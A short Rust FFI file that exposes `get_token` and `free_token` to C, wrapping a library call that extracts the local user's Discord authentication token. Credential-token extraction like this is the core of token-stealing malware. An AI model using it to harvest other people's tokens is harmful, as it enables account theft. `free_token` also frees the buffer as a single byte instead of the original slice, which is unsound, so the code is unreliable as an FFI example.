use std::boxed::Box;

/// It's ok for these functions to be unsafe, since they provide an interface
/// to C code by exposing a raw pointer which has to be freed manually by
/// using free_token()
/// The safety annotations are there to make clippy happy... :)

/// # Safety
/// This is utterly unsafe as it writes to int behind the len pointer.
/// At least we null-check it...
#[no_mangle]
pub unsafe extern "C" fn get_token(len: *mut usize) -> *mut u8 {
    if len.is_null() {
        return std::ptr::null_mut();
    }

    match token_extractor::get_discord_token_as_vec() {
        Ok(mut vec) => {
            vec.shrink_to_fit();
            unsafe {
                *len = vec.len();
            }
            Box::into_raw(vec.into_boxed_slice()) as *mut u8
        }
        _ => std::ptr::null_mut(),
    }
}

/// # Safety
/// This is unsafe since it dereferences a box from the passed pointer.
/// Let's hope the user properly passes in our allocated pointer...
#[no_mangle]
pub unsafe extern "C" fn free_token(ptr: *mut u8) {
    if !ptr.is_null() {
        unsafe {
            let allocated_box = Box::from_raw(ptr);
            drop(allocated_box);
        }
    }
}
